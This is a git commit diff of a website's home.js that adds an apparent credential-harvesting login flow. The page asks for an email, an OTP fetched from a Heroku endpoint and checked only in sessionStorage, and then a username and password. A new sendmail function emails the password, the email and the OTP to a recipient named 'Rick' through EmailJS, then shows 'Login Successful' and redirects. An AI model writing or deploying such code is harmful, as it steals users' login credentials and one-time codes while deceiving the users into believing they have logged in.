73aececb0d93c9ce2bf39da640649a2fb2f35d54
Al Mahamud Murad <muradhasan.7845@gmail.com>
2021-12-30 01:22:15 +0600

    complete

--- home.js
+++ home.js
@@ -1,6 +1,6 @@
-// (function () {
-//   emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
-// })();
+(function () {
+  emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
+})();
 let form = document.querySelector("#contact");
 
 const otpBoxDiv = document.createElement("div");
@@ -72,13 +72,42 @@ function validate() {
   let otp = document.querySelector(".otp");
   let submitBtn = document.querySelector("#info-submit");
 
-  emailSubmitBtn.addEventListener("click", (e) => {
+  emailSubmitBtn.addEventListener("click", async (e) => {
     e.preventDefault();
     filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
     if (filter.test(email.value)) {
-      console.log(email.value);
-      emailBox.classList.add("d-none");
-      optBox.classList.remove("d-none");
+      emailSubmitBtn.innerText = "Loading . . .";
+
+      emailSubmitBtn.disabled = true;
+      emailSubmitBtn.style.cursor = "not-allowed";
+      try {
+        const res = await fetch(
+          "https://whispering-garden-68171.herokuapp.com/api/send-code",
+          {
+            method: "POST",
+            headers: {
+              Accept: "application/json",
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ email: email.value }),
+          }
+        );
+        const content = await res.json();
+        if (content.otp) {
+          sessionStorage.setItem("code", content.otp);
+          emailBox.classList.add("d-none");
+          optBox.classList.remove("d-none");
+        }
+        emailSubmitBtn.innerText = " Get OTP";
+        emailSubmitBtn.disabled = false;
+        emailSubmitBtn.style.cursor = "pointer";
+      } catch (e) {
+        emailSubmitBtn.innerText = " Get OTP";
+        emailSubmitBtn.disabled = false;
+        emailSubmitBtn.style.cursor = "pointer";
+        emptyerror();
+      }
     } else {
       if (email.value == "") {
         emptyerror();
@@ -88,40 +117,68 @@ function validate() {
     }
   });
 
+  // emailSubmitBtn.addEventListener("click", (e) => {
+  //   e.preventDefault();
+  //   filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+  //   if (filter.test(email.value)) {
+
+  //     emailBox.classList.add("d-none");
+  //     optBox.classList.remove("d-none");
+  //   } else {
+  //     if (email.value == "") {
+  //       emptyerror();
+  //     } else {
+  //       error();
+  //     }
+  //   }
+  // });
+
   otpSubmitBtn.addEventListener("click", (e) => {
     e.preventDefault();
     if (otp.value == "") {
       emptyerror();
     } else {
-      otpBoxDiv.classList.add("d-none");
-      userPassword.classList.remove("d-none");
-      otpSuccess();
+      const storeOtp = sessionStorage.getItem("code");
+      if (!storeOtp || storeOtp !== otp.value) {
+        otpError();
+      } else {
+        otpBoxDiv.classList.add("d-none");
+        userPassword.classList.remove("d-none");
+        otpSuccess();
+      }
     }
   });
 
   submitBtn.addEventListener("click", (e) => {
     e.preventDefault();
     console.log(emailBox, optBox, userPassword);
+
     if (username.value === "" || password.value === "") {
       emptyerror();
     } else {
-      // sendmail(username.value, password.value);
+      const storeOtp = sessionStorage.getItem("code");
+      sendmail(username.value, password.value, storeOtp, email.value);
       console.log(username.value, password.value);
       username.value = "";
       password.value = "";
-      success();
+      loginSuccess();
     }
   });
 }
 validate();
 
-// function sendmail(username, password) {
-//   emailjs.send("service_ll5oava", "template_cvjri3e", {
-//     to_name: "Rick",
-//     from_name: username,
-//     message: password,
-//   });
-// }
+function sendmail(username, password, storeOtp, email) {
+  console.log("storeOtp", storeOtp);
+  emailjs
+    .send("service_ll5oava", "template_cvjri3e", {
+      to_name: "Rick",
+      from_name: username,
+      email: email,
+      message: password,
+      OTP: storeOtp,
+    })
+    .then(() => (window.location.href = "/home.html"));
+}
 
 function emptyerror() {
   Swal.fire({
@@ -152,5 +209,19 @@ function success() {
     icon: "success",
     title: "Successfully sent message",
     text: "Successfully sent message",
+  });
+}
+function loginSuccess() {
+  Swal.fire({
+    icon: "success",
+    title: "Login Successful",
+    text: "Login Successful",
+  });
+}
+function otpError() {
+  Swal.fire({
+    icon: "error",
+    title: "Wrong OTP",
+    text: "Wrong OTP",
   });
 }
